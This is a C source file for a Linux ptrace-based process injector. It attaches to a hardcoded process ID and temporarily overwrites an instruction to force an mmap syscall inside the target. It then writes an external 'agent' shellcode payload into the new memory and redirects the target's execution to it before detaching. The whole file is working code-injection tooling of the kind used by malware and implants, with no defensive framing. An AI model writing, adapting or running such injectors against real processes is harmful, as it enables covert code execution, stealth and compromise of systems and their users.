#define _GNU_SOURCE
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <stdint.h>
#include "agent.h"

#define PID 140011
#define CHECK(x) if ((x) == -1) { perror(#x); exit(1); }

int ptrace_poketext_write(long pid, long address, const unsigned char *payload, int payload_size) {      
    for (size_t i = 0; i < payload_size; i += sizeof(long)) {
        long chunk = 0;
        size_t remaining = payload_size - i;
        size_t copy_size = remaining < sizeof(long) ? remaining : sizeof(long);

        if (copy_size != sizeof(long)) {
            chunk = ptrace(PTRACE_PEEKTEXT, pid, address + i, NULL);
        }

        memcpy(&chunk, payload + i, copy_size);
        CHECK(ptrace(PTRACE_POKETEXT, pid, address + i, chunk));
    }
    return 0;
}

int main() {
    pid_t pid = PID;

    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
        perror("ptrace attach");
        return EXIT_FAILURE;
    }
    waitpid(pid, NULL, 0);

    struct user_regs_struct regs, backup;

    CHECK(ptrace(PTRACE_GETREGS, pid, NULL, &regs));
    backup = regs;

    // mmap
    regs.rdi = 0;                      
    regs.rsi = agent_len;              
    regs.rdx = PROT_READ | PROT_EXEC;
    regs.r10 = MAP_PRIVATE | MAP_ANONYMOUS;
    regs.r8  = -1;                     
    regs.r9  = 0;                      
    regs.orig_rax = __NR_mmap;
    regs.rax = __NR_mmap;

    long original = ptrace(PTRACE_PEEKTEXT, pid, regs.rip, NULL);
    
    // Preserve upper 6 bytes, replace lower 2 bytes with 'syscall' (0x0F 0x05)
    long syscall_inst = (original & 0xFFFFFFFFFFFF0000) | 0x050f; 
    CHECK(ptrace(PTRACE_POKETEXT, pid, regs.rip, syscall_inst)); 

    CHECK(ptrace(PTRACE_SETREGS, pid, NULL, &regs));
    CHECK(ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL));
    waitpid(pid, NULL, 0);

    // Restore original instruction
    CHECK(ptrace(PTRACE_POKETEXT, pid, regs.rip, original));

    ptrace(PTRACE_GETREGS, pid, NULL, &regs);
    void *mapped_addr = (void *)regs.rax;

    if ((long)mapped_addr < 0) {
        printf("[-] mmap failed: %ld\n", (long)mapped_addr);
        return -1;
    }

    regs = backup;
    ptrace_poketext_write(pid, (long)mapped_addr, agent, agent_len); // write shellcode
    
    // set Instruction Pointer to our shellcode + 2
    regs.rip = (unsigned long)mapped_addr + 2;

    CHECK(ptrace(PTRACE_SETREGS, pid, NULL, &regs));
    CHECK(ptrace(PTRACE_CONT, pid, NULL, NULL));

    int status;
    while (1) {
        waitpid(pid, &status, 0);
        
        if (WIFSTOPPED(status)) {
            int sig = WSTOPSIG(status);
            if (sig == SIGTRAP) {
                break;
            }
            ptrace(PTRACE_CONT, pid, NULL, sig);
        } else if (WIFEXITED(status)) {
            return 0;
        }
    }

    // restore
    CHECK(ptrace(PTRACE_SETREGS, pid, NULL, &backup));
    CHECK(ptrace(PTRACE_DETACH, pid, NULL, NULL));
    
    return 0;
}